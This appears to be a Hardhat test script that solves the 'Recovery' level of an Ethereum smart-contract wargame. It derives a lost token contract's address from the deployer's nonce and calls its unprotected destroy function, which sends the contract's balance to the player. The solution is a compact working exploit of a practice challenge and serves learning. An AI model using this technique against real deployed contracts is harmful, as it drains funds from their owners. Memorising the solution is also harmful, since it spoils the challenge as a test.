import { ethers } from "hardhat";
import { expectLevelSolved } from "../utils";
import { txConfirmation } from "./utils";

describe("Recovery Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "17", 
    solutionFn: async ({ challenge, accounts: [ eoa ] }) => {
      const tokenContract = await ethers.getContractAt(
        "SimpleToken", ethers.utils.getContractAddress({ from: challenge.address, nonce: 1})
      );
      await txConfirmation(tokenContract.destroy(eoa.address));
    }
  }));
});
